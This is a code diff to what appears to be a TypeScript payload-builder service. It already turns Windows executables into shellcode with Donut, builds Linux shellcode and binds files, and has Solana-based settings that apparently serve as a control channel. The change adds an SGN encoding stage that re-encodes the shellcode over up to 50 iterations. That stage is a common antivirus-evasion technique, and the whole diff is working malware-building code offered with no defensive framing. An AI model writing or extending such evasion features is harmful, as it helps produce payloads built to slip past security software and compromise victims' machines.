@@ -18,6 +18,7 @@ import {
 } from "./toolchain-manager";
 import { runDonut } from "./donut-manager";
 import { buildLinuxShellcode } from "./linux-shellcode-manager";
+import { runSgn } from "./sgn-manager";
 
 function isClientModuleDir(dir: string): boolean {
   return (
@@ -109,6 +110,8 @@ type BuildProcessConfig = {
   useDonut?: boolean;
   useLinuxShellcode?: boolean;
   shellcodeConsole?: boolean;
+  useSgn?: boolean;
+  sgnIterations?: number;
   solMemo?: boolean;
   solAddress?: string;
   solRpcEndpoints?: string;
@@ -1196,6 +1199,9 @@ func runBoundFiles() {
         let finalOutputName = outputName;
         let finalOutputSize = finalSize;
 
+        let shellcodeBinPath: string | null = null;
+        let shellcodeArch: "amd64" | "386" | null = null;
+
         if (config.useDonut && os === "windows") {
           sendToStream({ type: "status", text: `Converting ${platform} PE to shellcode…` });
           sendToStream({ type: "output", text: `\nConverting PE → shellcode with Donut...\n`, level: "info" });
@@ -1207,6 +1213,8 @@ func runBoundFiles() {
           try { fs.unlinkSync(filePath); } catch {}
           finalOutputName = scOutputName;
           finalOutputSize = Bun.file(binPath).size;
+          shellcodeBinPath = binPath;
+          shellcodeArch = donutArch;
           sendToStream({ type: "output", text: `Shellcode ready: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
         }
 
@@ -1221,7 +1229,19 @@ func runBoundFiles() {
           try { fs.unlinkSync(filePath); } catch {}
           finalOutputName = scOutputName;
           finalOutputSize = Bun.file(binPath).size;
+          shellcodeBinPath = binPath;
+          shellcodeArch = "amd64";
           sendToStream({ type: "output", text: `Shellcode ready: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
+        }
+
+        if (config.useSgn && shellcodeBinPath && shellcodeArch) {
+          const iters = Math.max(1, Math.min(50, Math.floor(config.sgnIterations ?? 1)));
+          sendToStream({ type: "status", text: `Encoding ${platform} shellcode with SGN (×${iters})…` });
+          sendToStream({ type: "output", text: `\nEncoding shellcode with SGN (${iters} iteration${iters === 1 ? "" : "s"})...\n`, level: "info" });
+          const ok = await runSgn(shellcodeBinPath, shellcodeBinPath, shellcodeArch, iters, sendToStream);
+          if (!ok) throw new Error(`SGN encoding failed for ${platform}`);
+          finalOutputSize = Bun.file(shellcodeBinPath).size;
+          sendToStream({ type: "output", text: `SGN-encoded shellcode: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
         }
 
         (build.files as any[]).push({
